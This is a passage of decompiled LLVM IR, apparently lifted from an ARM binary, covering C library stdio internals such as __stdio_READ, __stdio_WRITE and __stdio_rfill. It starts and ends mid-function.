  store i32 %v1_1687c, i32* %r8.global-to-local, align 4
  %v1_16880 = inttoptr i32 %v1_1687c to i32*
  %v2_16880 = load i32, i32* %v1_16880, align 4
  store i32 %v2_16880, i32* %r8.global-to-local, align 4
  %v3_16880 = add i32 %v0_1687c, 12
  %v4_16880 = inttoptr i32 %v3_16880 to i32*
  %v5_16880 = load i32, i32* %v4_16880, align 4
  store i32 %v5_16880, i32* %sb.global-to-local, align 4
  %v1_16884 = inttoptr i32 %v0_16884 to i32*
  store i32 %v2_16878, i32* %v1_16884, align 4
  %v3_16884 = add i32 %v0_16884, 4
  %v4_16884 = inttoptr i32 %v3_16884 to i32*
  %v5_16884 = load i32, i32* @r4, align 4
  store i32 %v5_16884, i32* %v4_16884, align 4
  %v0_16888 = load i32, i32* %r8.global-to-local, align 4
  %v1_16888 = load i32, i32* @r5, align 4
  %v2_16888 = add i32 %v1_16888, 8
  %v3_16888 = inttoptr i32 %v2_16888 to i32*
  store i32 %v0_16888, i32* %v3_16888, align 4
  %v0_1688c = load i32, i32* %sb.global-to-local, align 4
  %v1_1688c = load i32, i32* @r5, align 4
  %v2_1688c = add i32 %v1_1688c, 12
  %v3_1688c = inttoptr i32 %v2_1688c to i32*
  store i32 %v0_1688c, i32* %v3_1688c, align 4
  %v0_16890 = load i32, i32* @ip, align 4
  %v1_16890 = trunc i32 %v0_16890 to i16
  %v2_16890 = load i32, i32* @r5, align 4
  %v3_16890 = add i32 %v2_16890, 16
  %v4_16890 = inttoptr i32 %v3_16890 to i16*
  store i16 %v1_16890, i16* %v4_16890, align 2
  %v0_16894 = load i32, i32* @r7, align 4
  %v1_16894 = add i32 %v0_16894, 18
  %v2_16894 = inttoptr i32 %v1_16894 to i8*
  %v3_16894 = load i8, i8* %v2_16894, align 1
  %v4_16894 = zext i8 %v3_16894 to i32
  store i32 %v4_16894, i32* @r3, align 4
  %v2_16898 = load i32, i32* @r5, align 4
  %v3_16898 = add i32 %v2_16898, 18
  %v4_16898 = inttoptr i32 %v3_16898 to i8*
  store i8 %v3_16894, i8* %v4_16898, align 1
  %v0_1689c = call i32 @memcpy()
  %v0_168a0 = load i32, i32* @r7, align 4
  %v1_168a0 = add i32 %v0_168a0, 16
  %v2_168a0 = inttoptr i32 %v1_168a0 to i16*
  %v3_168a0 = load i16, i16* %v2_168a0, align 2
  %v4_168a0 = zext i16 %v3_168a0 to i32
  %v0_168a4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_168a4, i32* @r5, align 4
  %v2_168a8 = add i32 %v4_168a0, %v0_168a0
  store i32 %v2_168a8, i32* @r7, align 4
  br label %dec_label_pc_168ac

dec_label_pc_168ac:                               ; preds = %dec_label_pc_167fc, %dec_label_pc_16878
  %v0_16884 = phi i32 [ %tmp, %dec_label_pc_167fc ], [ %v0_168a4, %dec_label_pc_16878 ]
  %v0_1687c = phi i32 [ %v1_167b0, %dec_label_pc_167fc ], [ %v2_168a8, %dec_label_pc_16878 ]
  %v3_168b0 = icmp ult i32 %v0_1687c, %v2_167fc
  %v1_168b4 = add i32 %v0_16884, 19
  store i32 %v1_168b4, i32* @r0, align 4
  %v1_168b8 = add i32 %v0_1687c, 19
  store i32 %v1_168b8, i32* @r1, align 4
  br i1 %v3_168b0, label %dec_label_pc_1681c, label %dec_label_pc_168c0.loopexit

dec_label_pc_168c0.loopexit:                      ; preds = %dec_label_pc_168ac
  %v0_168c0.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_168c0

dec_label_pc_168c0:                               ; preds = %dec_label_pc_168c0.loopexit, %dec_label_pc_1683c
  %v1_168c0 = phi i32 [ %v0_16884, %dec_label_pc_168c0.loopexit ], [ %v0_16854, %dec_label_pc_1683c ]
  %v0_168c0 = phi i32 [ %v0_168c0.pre, %dec_label_pc_168c0.loopexit ], [ %v1_16854, %dec_label_pc_1683c ]
  %v2_168c0 = sub i32 %v1_168c0, %v0_168c0
  store i32 %v2_168c0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_168c4

dec_label_pc_168c4:                               ; preds = %dec_label_pc_167f4, %dec_label_pc_1685c, %dec_label_pc_167d8, %dec_label_pc_168c0
  %v0_168c4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_16798, i32* @r5, align 4
  store i32 %v12_16798, i32* @r7, align 4
  ret i32 %v0_168c4

; uselistorder directives
  uselistorder i32 %v0_1687c, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_16884, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_167b0, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 2, 3, 0, 1, 4, 5, 6 }
  uselistorder i32 18, { 4, 5, 3, 6, 2, 7, 0, 8, 1, 9 }
  uselistorder i32 22, { 1, 0, 12, 2, 3, 4, 5, 6, 9, 7, 10, 8, 11, 13 }
  uselistorder i32* @sp, { 2, 3, 1, 4, 0 }
  uselistorder i32 -8, { 38, 14, 11, 12, 13, 8, 21, 22, 23, 24, 25, 26, 20, 19, 10, 18, 17, 16, 15, 27, 28, 29, 30, 31, 9, 39, 32, 33, 34, 35, 36, 40, 41, 37, 42, 0, 1, 4, 3, 2, 5, 6, 7 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_168c4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_168ac, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_168dc = load i32, i32* @r4, align 4
  store i32 %v3_168dc, i32* %stack_var_-12, align 4
  %v0_168e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_168e0 = inttoptr i32 %v0_168e0 to i16*
  %v2_168e0 = load i16, i16* %v1_168e0, align 2
  %v3_168e0 = zext i16 %v2_168e0 to i32
  store i32 %v3_168e0, i32* @r3, align 4
  %v1_168e4 = and i32 %v3_168e0, 4
  store i32 %v1_168e4, i32* @r5, align 4
  %v2_168e4 = icmp eq i32 %v1_168e4, 0
  store i32 %v0_168e0, i32* @r4, align 4
  br i1 %v2_168e4, label %dec_label_pc_168f8, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_168f8:                               ; preds = %entry
  %v1_168f8 = icmp slt i32 %arg2, 0
  br i1 %v1_168f8, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_168f8
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_168f8, %bb18
  %v1_16900 = add i32 %v0_168e0, 4
  %v2_16900 = inttoptr i32 %v1_16900 to i32*
  %v3_16900 = load i32, i32* %v2_16900, align 4
  store i32 %v3_16900, i32* %r0.global-to-local, align 4
  %v1_16904 = call i32 @__libc_read(i32 %v3_16900)
  store i32 %v1_16904, i32* %r0.global-to-local, align 4
  %v5_1690c = icmp sgt i32 %v1_16904, 0
  br i1 %v5_1690c, label %.thread7, label %dec_label_pc_16910

dec_label_pc_16910:                               ; preds = %bb19
  %v2_16908 = icmp eq i32 %v1_16904, 0
  %v0_16910 = load i32, i32* @r4, align 4
  %v1_16910 = inttoptr i32 %v0_16910 to i16*
  %v2_16910 = load i16, i16* %v1_16910, align 2
  br i1 %v2_16908, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_16910
  %v2_16914 = or i16 %v2_16910, 4
  store i16 %v2_16914, i16* %v1_16910, align 2
  %v1_16930.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_16910
  %v2_16918 = or i16 %v2_16910, 8
  store i16 %v2_16918, i16* %v1_16910, align 2
  %v1_16924 = load i32, i32* @r5, align 4
  store i32 %v1_16924, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_16930 = phi i32 [ %v1_16930.pre, %bb20 ], [ 0, %bb ], [ %v1_16904, %bb19 ], [ %v1_16924, %bb21 ]
  %v2_1692c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1692c, i32* @r4, align 4
  ret i32 %v1_16930

; uselistorder directives
  uselistorder i16 %v2_16910, { 1, 0 }
  uselistorder i32 %v1_16904, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 1, 0 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_169f82 = icmp eq i32 %arg3, 0
  store i1 %v2_169f82, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_169f82, label %dec_label_pc_16a00, label %dec_label_pc_16950

dec_label_pc_16950:                               ; preds = %entry, %dec_label_pc_169f8thread-pre-split.dec_label_pc_16950_crit_edge
  %v0_1695c = phi i32 [ %v0_1695c.pre, %dec_label_pc_169f8thread-pre-split.dec_label_pc_16950_crit_edge ], [ %tmp, %entry ]
  %v0_16958 = phi i32 [ %v5_16968, %dec_label_pc_169f8thread-pre-split.dec_label_pc_16950_crit_edge ], [ %arg2, %entry ]
  %v3_16950 = phi i32 [ %v3_16950.pre, %dec_label_pc_169f8thread-pre-split.dec_label_pc_16950_crit_edge ], [ 2147483647, %entry ]
  %v0_16954.in = phi i32 [ %v5_1696c, %dec_label_pc_169f8thread-pre-split.dec_label_pc_16950_crit_edge ], [ %arg3, %entry ]
  %v3_16954 = phi i32 [ %v5_1696c, %dec_label_pc_169f8thread-pre-split.dec_label_pc_16950_crit_edge ], [ %arg3, %entry ]
  %v0_16954 = icmp slt i32 %v0_16954.in, 0
  %storemerge = select i1 %v0_16954, i32 %v3_16950, i32 %v3_16954
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_16958, i32* %r1.global-to-local, align 4
  %v1_1695c = add i32 %v0_1695c, 4
  %v2_1695c = inttoptr i32 %v1_1695c to i32*
  %v3_1695c = load i32, i32* %v2_1695c, align 4
  %tmp21 = inttoptr i32 %v0_16958 to i64*
  %v4_16960 = call i32 @__GI___libc_write(i32 %v3_1695c, i64* %tmp21)
  %v1_16964 = icmp slt i32 %v4_16960, 0
  %v2_16964 = icmp eq i32 %v4_16960, 0
  store i1 %v2_16964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_16964, label %dec_label_pc_16974, label %dec_label_pc_169f8thread-pre-split

dec_label_pc_16974:                               ; preds = %dec_label_pc_16950
  %v0_16974 = load i32, i32* @r4, align 4
  %v1_16974 = inttoptr i32 %v0_16974 to i16*
  %v2_16974 = load i16, i16* %v1_16974, align 2
  %v1_16978 = or i16 %v2_16974, 8
  store i16 %v1_16978, i16* %v1_16974, align 2
  store i32 41948, i32* %r3.global-to-local, align 4
  %v0_16984 = call i32 @__aeabi_read_tp()
  %v3_16988 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_16988 = sext i16 %v3_16988 to i32
  store i32 %v4_16988, i32* %r3.global-to-local, align 4
  %v2_1698c = add i32 %v4_16988, %v0_16984
  %v3_1698c = inttoptr i32 %v2_1698c to i32*
  %v4_1698c = load i32, i32* %v3_1698c, align 4
  store i32 %v4_1698c, i32* %r3.global-to-local, align 4
  %v7_16990 = icmp eq i32 %v4_1698c, 4
  store i1 %v7_16990, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16990, label %dec_label_pc_1699c, label %bb22

bb22:                                             ; preds = %dec_label_pc_16974
  %v8_16994 = icmp eq i32 %v4_1698c, 11
  store i1 %v8_16994, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_16994, label %dec_label_pc_1699c, label %dec_label_pc_16a00

dec_label_pc_1699c:                               ; preds = %dec_label_pc_16974, %bb22
  %v0_1699c = load i32, i32* @r4, align 4
  %v1_1699c = add i32 %v0_1699c, 8
  store i32 %v1_1699c, i32* %r2.global-to-local, align 4
  %v1_169a0 = inttoptr i32 %v1_1699c to i32*
  %v2_169a0 = load i32, i32* %v1_169a0, align 4
  store i32 %v2_169a0, i32* %r2.global-to-local, align 4
  %v3_169a0 = add i32 %v0_1699c, 12
  %v4_169a0 = inttoptr i32 %v3_169a0 to i32*
  %v5_169a0 = load i32, i32* %v4_169a0, align 4
  store i32 %v5_169a0, i32* %r3.global-to-local, align 4
  %v2_169a4 = sub i32 %v5_169a0, %v2_169a0
  store i32 %v2_169a4, i32* %r1.global-to-local, align 4
  %v9_169a4 = icmp eq i32 %v5_169a0, %v2_169a0
  store i1 %v9_169a4, i1* %cpsr_z.global-to-local, align 1
  %v0_169f0.pre = load i32, i32* @r5, align 4
  br i1 %v9_169a4, label %dec_label_pc_169f0, label %dec_label_pc_169ac

dec_label_pc_169ac:                               ; preds = %dec_label_pc_1699c
  %v3_169ac = icmp ult i32 %v2_169a4, %v0_169f0.pre
  %v9_169ac = icmp eq i32 %v2_169a4, %v0_169f0.pre
  store i1 %v9_169ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_169ac, label %.preheader, label %bb23

bb23:                                             ; preds = %dec_label_pc_169ac
  store i32 %v0_169f0.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_169ac, %bb23, %dec_label_pc_169d4
  %v2_169c0 = phi i32 [ %v1_169d8, %dec_label_pc_169d4 ], [ %v2_169a0, %bb23 ], [ %v2_169a0, %dec_label_pc_169ac ]
  %v0_169b4 = load i32, i32* @r6, align 4
  %v1_169b4 = inttoptr i32 %v0_169b4 to i8*
  %v2_169b4 = load i8, i8* %v1_169b4, align 1
  %v3_169b4 = zext i8 %v2_169b4 to i32
  store i32 %v3_169b4, i32* %r3.global-to-local, align 4
  %v7_169b8 = icmp eq i8 %v2_169b4, 10
  store i1 %v7_169b8, i1* %cpsr_z.global-to-local, align 1
  %v1_169bc = add i32 %v0_169b4, 1
  store i32 %v1_169bc, i32* @r6, align 4
  %v3_169c0 = inttoptr i32 %v2_169c0 to i8*
  store i8 %v2_169b4, i8* %v3_169c0, align 1
  %v0_169c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_169c4, label %dec_label_pc_169c8, label %dec_label_pc_169d4

dec_label_pc_169c8:                               ; preds = %.preheader
  %v0_169c8 = load i32, i32* @r4, align 4
  %v1_169c8 = inttoptr i32 %v0_169c8 to i16*
  %v2_169c8 = load i16, i16* %v1_169c8, align 2
  %v3_169c8 = zext i16 %v2_169c8 to i32
  store i32 %v3_169c8, i32* %r3.global-to-local, align 4
  %v1_169cc = and i32 %v3_169c8, 256
  %v2_169cc = icmp eq i32 %v1_169cc, 0
  store i1 %v2_169cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_169cc, label %dec_label_pc_169d4, label %dec_label_pc_169c8.dec_label_pc_169e0_crit_edge

dec_label_pc_169c8.dec_label_pc_169e0_crit_edge:  ; preds = %dec_label_pc_169c8
  %v0_169e4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_169e0

dec_label_pc_169d4:                               ; preds = %dec_label_pc_169c8, %.preheader
  %v0_169d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_169d4 = add i32 %v0_169d4, -1
  store i32 %v1_169d4, i32* %r1.global-to-local, align 4
  %v7_169d4 = icmp eq i32 %v0_169d4, 1
  store i1 %v7_169d4, i1* %cpsr_z.global-to-local, align 1
  %v0_169d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_169d8 = add i32 %v0_169d8, 1
  store i32 %v1_169d8, i32* %r2.global-to-local, align 4
  br i1 %v7_169d4, label %dec_label_pc_169d4.dec_label_pc_169e0_crit_edge, label %.preheader

dec_label_pc_169d4.dec_label_pc_169e0_crit_edge:  ; preds = %dec_label_pc_169d4
  %v0_169e0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_169e0

dec_label_pc_169e0:                               ; preds = %dec_label_pc_169c8.dec_label_pc_169e0_crit_edge, %dec_label_pc_169d4.dec_label_pc_169e0_crit_edge
  %v0_169e4 = phi i32 [ %v1_169d8, %dec_label_pc_169d4.dec_label_pc_169e0_crit_edge ], [ %v0_169e4.pre, %dec_label_pc_169c8.dec_label_pc_169e0_crit_edge ]
  %v0_169e0 = phi i32 [ %v0_169e0.pre, %dec_label_pc_169d4.dec_label_pc_169e0_crit_edge ], [ %v0_169c8, %dec_label_pc_169c8.dec_label_pc_169e0_crit_edge ]
  %v1_169e0 = add i32 %v0_169e0, 8
  %v2_169e0 = inttoptr i32 %v1_169e0 to i32*
  %v3_169e0 = load i32, i32* %v2_169e0, align 4
  store i32 %v3_169e0, i32* %r3.global-to-local, align 4
  %v2_169e4 = add i32 %v0_169e0, 16
  %v3_169e4 = inttoptr i32 %v2_169e4 to i32*
  store i32 %v0_169e4, i32* %v3_169e4, align 4
  %v0_169e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_169e8 = load i32, i32* %r2.global-to-local, align 4
  %v2_169e8 = sub i32 %v1_169e8, %v0_169e8
  store i32 %v2_169e8, i32* %r3.global-to-local, align 4
  %v1_169ec = load i32, i32* @r5, align 4
  %v2_169ec = sub i32 %v1_169ec, %v2_169e8
  br label %dec_label_pc_169f0

dec_label_pc_169f0:                               ; preds = %dec_label_pc_1699c, %dec_label_pc_169e0
  %v0_169f0 = phi i32 [ %v2_169ec, %dec_label_pc_169e0 ], [ %v0_169f0.pre, %dec_label_pc_1699c ]
  %v1_169f0 = load i32, i32* @r7, align 4
  %v2_169f0 = sub i32 %v1_169f0, %v0_169f0
  store i32 %v2_169f0, i32* @r7, align 4
  br label %dec_label_pc_16a00

dec_label_pc_169f8thread-pre-split:               ; preds = %dec_label_pc_16950
  %v3_16968 = load i32, i32* @r6, align 4
  %v5_16968 = add i32 %v3_16968, %v4_16960
  store i32 %v5_16968, i32* @r6, align 4
  %v4_1696c = load i32, i32* @r5, align 4
  %v5_1696c = sub i32 %v4_1696c, %v4_16960
  store i32 %v5_1696c, i32* @r5, align 4
  %v2_169f8 = icmp eq i32 %v5_1696c, 0
  store i1 %v2_169f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_169f8, label %dec_label_pc_16a00, label %dec_label_pc_169f8thread-pre-split.dec_label_pc_16950_crit_edge

dec_label_pc_169f8thread-pre-split.dec_label_pc_16950_crit_edge: ; preds = %dec_label_pc_169f8thread-pre-split
  %v3_16950.pre = load i32, i32* @r8, align 4
  %v0_1695c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16950

dec_label_pc_16a00:                               ; preds = %dec_label_pc_169f8thread-pre-split, %entry, %bb22, %dec_label_pc_169f0
  %v0_16a00 = load i32, i32* @r7, align 4
  ret i32 %v0_16a00

; uselistorder directives
  uselistorder i32 %v5_1696c, { 1, 3, 0, 2 }
  uselistorder i32 %v5_16968, { 1, 0 }
  uselistorder i32 %v0_169e0, { 1, 0 }
  uselistorder i32 %v1_169d8, { 0, 2, 1 }
  uselistorder i32 %v0_169d4, { 1, 0 }
  uselistorder i32 %v0_169f0.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_169a0, { 1, 0, 2 }
  uselistorder i32 %v2_169a0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v4_16960, { 1, 0, 2, 3 }
  uselistorder i32 %v0_16958, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 1, 4, 2, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i8 10, { 1, 0 }
  uselistorder i32 11, { 10, 7, 8, 9, 22, 23, 0, 11, 12, 13, 14, 2, 15, 3, 16, 4, 17, 18, 5, 19, 6, 20, 1, 21, 24 }
  uselistorder i32 2147483647, { 1, 5, 6, 0, 2, 3, 4 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_16a00, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_169f0, { 1, 0 }
  uselistorder label %dec_label_pc_169e0, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1699c, { 1, 0 }
  uselistorder label %dec_label_pc_16950, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16a10 = load i32, i32* @r4, align 4
  store i32 %v3_16a10, i32* %stack_var_-8, align 4
  %v1_16a14 = add i32 %arg1, 8
  %v1_16a18 = inttoptr i32 %v1_16a14 to i32*
  %v2_16a18 = load i32, i32* %v1_16a18, align 4
  store i32 %v2_16a18, i32* @r1, align 4
  %v3_16a18 = add i32 %arg1, 12
  %v4_16a18 = inttoptr i32 %v3_16a18 to i32*
  %v5_16a18 = load i32, i32* %v4_16a18, align 4
  %v2_16a1c = sub i32 %v5_16a18, %v2_16a18
  store i32 %v2_16a1c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_16a24 = inttoptr i32 %arg1 to i16*
  %v4_16a24 = call i32 @__stdio_READ(i16* %v3_16a24, i32 %v2_16a18, i32 %v2_16a1c)
  %v0_16a28 = load i32, i32* @r4, align 4
  %v1_16a28 = add i32 %v0_16a28, 8
  %v2_16a28 = inttoptr i32 %v1_16a28 to i32*
  %v3_16a28 = load i32, i32* %v2_16a28, align 4
  store i32 %v3_16a28, i32* %r2.global-to-local, align 4
  %v2_16a2c = add i32 %v3_16a28, %v4_16a24
  %v2_16a30 = add i32 %v0_16a28, 20
  %v3_16a30 = inttoptr i32 %v2_16a30 to i32*
  store i32 %v2_16a2c, i32* %v3_16a30, align 4
  %v0_16a34 = load i32, i32* %r2.global-to-local, align 4
  %v1_16a34 = load i32, i32* @r4, align 4
  %v2_16a34 = add i32 %v1_16a34, 16
  %v3_16a34 = inttoptr i32 %v2_16a34 to i32*
  store i32 %v0_16a34, i32* %v3_16a34, align 4
  %v2_16a38 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16a38, i32* @r4, align 4
  ret i32 %v4_16a24

; uselistorder directives
  uselistorder i32 %v4_16a24, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_16a40 = load i32, i32* @r4, align 4
  store i32 %v3_16a40, i32* %stack_var_-12, align 4
  %v0_16a44 = load i32, i32* @r0, align 4
  %v1_16a44 = inttoptr i32 %v0_16a44 to i16*
  %v2_16a44 = load i16, i16* %v1_16a44, align 2
  %v3_16a44 = zext i16 %v2_16a44 to i32
  store i32 %v3_16a44, i32* %r3.global-to-local, align 4
  %v0_16a48 = load i32, i32* @r1, align 4
  %v2_16a48 = and i32 %v0_16a48, %v3_16a44
  %v4_16a48 = icmp eq i32 %v2_16a48, 0
  store i32 %v0_16a44, i32* @r4, align 4
  br i1 %v4_16a48, label %dec_label_pc_16a58, label %dec_label_pc_16a68

dec_label_pc_16a58:                               ; preds = %entry
  %v1_16a58 = and i32 %v3_16a44, 2176
  %v2_16a58 = icmp eq i32 %v1_16a58, 0
  br i1 %v2_16a58, label %dec_label_pc_16a60, label %dec_label_pc_16a74

dec_label_pc_16a60:                               ; preds = %dec_label_pc_16a58
  %v2_16a60 = or i32 %v0_16a48, %v3_16a44
  store i32 %v2_16a60, i32* %r3.global-to-local, align 4
  %v1_16a64 = trunc i32 %v2_16a60 to i16
  store i16 %v1_16a64, i16* %v1_16a44, align 2
  %v0_16a68.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16a68

dec_label_pc_16a68:                               ; preds = %entry, %dec_label_pc_16a60
  %v0_16a68 = phi i32 [ %v0_16a44, %entry ], [ %v0_16a68.pre, %dec_label_pc_16a60 ]
  %v1_16a68 = inttoptr i32 %v0_16a68 to i16*
  %v2_16a68 = load i16, i16* %v1_16a68, align 2
  %v3_16a68 = zext i16 %v2_16a68 to i32
  store i32 %v3_16a68, i32* %r3.global-to-local, align 4
  %v1_16a6c = and i32 %v3_16a68, 16
  store i32 %v1_16a6c, i32* %r5.global-to-local, align 4
  %v2_16a6c = icmp eq i32 %v1_16a6c, 0
  br i1 %v2_16a6c, label %dec_label_pc_16a9c, label %dec_label_pc_16a74

dec_label_pc_16a74:                               ; preds = %dec_label_pc_16a58, %dec_label_pc_16a68
  store i32 41704, i32* %r3.global-to-local, align 4
  %v0_16a78 = call i32 @__aeabi_read_tp()
  store i32 %v0_16a78, i32* %r0.global-to-local, align 4
  %v3_16a7c = load i16, i16* @global_var_20d6c.590, align 2
  %v4_16a7c = sext i16 %v3_16a7c to i32
  store i32 %v4_16a7c, i32* %r3.global-to-local, align 4
  %v3_16a84 = add i32 %v4_16a7c, %v0_16a78
  %v4_16a84 = inttoptr i32 %v3_16a84 to i32*
  store i32 9, i32* %v4_16a84, align 4
  br label %dec_label_pc_16a88

dec_label_pc_16a88:                               ; preds = %dec_label_pc_16aa4, %dec_label_pc_16a74
  %v0_16a88 = load i32, i32* @r4, align 4
  %v1_16a88 = inttoptr i32 %v0_16a88 to i16*
  %v2_16a88 = load i16, i16* %v1_16a88, align 2
  %v3_16a88 = zext i16 %v2_16a88 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_16a90 = or i32 %v3_16a88, 8
  store i32 %v1_16a90, i32* %r3.global-to-local, align 4
  %v1_16a94 = trunc i32 %v1_16a90 to i16
  store i16 %v1_16a94, i16* %v1_16a88, align 2
  %v1_16adc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16ad4

dec_label_pc_16a9c:                               ; preds = %dec_label_pc_16a68
  %v1_16a9c = and i32 %v3_16a68, 64
  %v2_16a9c = icmp eq i32 %v1_16a9c, 0
  br i1 %v2_16a9c, label %dec_label_pc_16ac4, label %dec_label_pc_16aa4

dec_label_pc_16aa4:                               ; preds = %dec_label_pc_16a9c
  %v0_16aa4 = load i32, i32* @r0, align 4
  %v1_16aa4 = call i32 @__stdio_wcommit(i32 %v0_16aa4)
  store i32 %v1_16aa4, i32* %r0.global-to-local, align 4
  %v2_16aa8 = icmp eq i32 %v1_16aa4, 0
  br i1 %v2_16aa8, label %dec_label_pc_16ab0, label %dec_label_pc_16a88

dec_label_pc_16ab0:                               ; preds = %dec_label_pc_16aa4
  %v0_16ab0 = load i32, i32* @r4, align 4
  %v1_16ab0 = inttoptr i32 %v0_16ab0 to i16*
  %v2_16ab0 = load i16, i16* %v1_16ab0, align 2
  %v3_16ab0 = zext i16 %v2_16ab0 to i32
  store i32 %v3_16ab0, i32* %r3.global-to-local, align 4
  %v1_16ab4 = add i32 %v0_16ab0, 8
  %v2_16ab4 = inttoptr i32 %v1_16ab4 to i32*
  %v3_16ab4 = load i32, i32* %v2_16ab4, align 4
  %v1_16ab8 = and i32 %v3_16ab0, 65471
  store i32 %v1_16ab8, i32* %r3.global-to-local, align 4
  %v2_16abc = add i32 %v0_16ab0, 28
  %v3_16abc = inttoptr i32 %v2_16abc to i32*
  store i32 %v3_16ab4, i32* %v3_16abc, align 4
  %v0_16ac0 = load i32, i32* %r3.global-to-local, align 4
  %v1_16ac0 = trunc i32 %v0_16ac0 to i16
  %v2_16ac0 = load i32, i32* @r4, align 4
  %v3_16ac0 = inttoptr i32 %v2_16ac0 to i16*
  store i16 %v1_16ac0, i16* %v3_16ac0, align 2
  %v0_16ac4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16ac4

dec_label_pc_16ac4:                               ; preds = %dec_label_pc_16a9c, %dec_label_pc_16ab0
  %v2_16acc = phi i32 [ %v0_16a68, %dec_label_pc_16a9c ], [ %v0_16ac4.pre, %dec_label_pc_16ab0 ]
  %v1_16ac4 = inttoptr i32 %v2_16acc to i16*
  %v2_16ac4 = load i16, i16* %v1_16ac4, align 2
  %v3_16ac4 = zext i16 %v2_16ac4 to i32
  %v1_16ac8 = or i32 %v3_16ac4, 1
  store i32 %v1_16ac8, i32* %r3.global-to-local, align 4
  %v1_16acc = trunc i32 %v1_16ac8 to i16
  store i16 %v1_16acc, i16* %v1_16ac4, align 2
  %v0_16ad0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16ad0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16ad4

dec_label_pc_16ad4:                               ; preds = %dec_label_pc_16a88, %dec_label_pc_16ac4
  %v1_16adc = phi i32 [ %v1_16adc.pre, %dec_label_pc_16a88 ], [ %v0_16ad0, %dec_label_pc_16ac4 ]
